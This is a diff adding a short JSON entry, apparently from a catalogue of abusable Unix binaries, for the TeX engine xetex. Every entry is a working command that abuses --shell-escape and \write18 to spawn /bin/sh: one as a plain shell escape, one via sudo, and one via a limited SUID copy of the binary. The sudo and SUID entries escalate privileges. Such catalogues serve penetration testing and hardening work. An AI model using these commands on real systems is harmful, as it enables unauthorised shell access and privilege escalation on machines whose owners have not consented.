@@ -1,0 +1,19 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "xetex --shell-escape '\\write18{/bin/sh}\\end'\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo xetex --shell-escape '\\write18{/bin/sh}\\end'\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "code": "./xetex --shell-escape '\\write18{/bin/sh}\\end'\n"
+      }
+    ]
+  }
+}
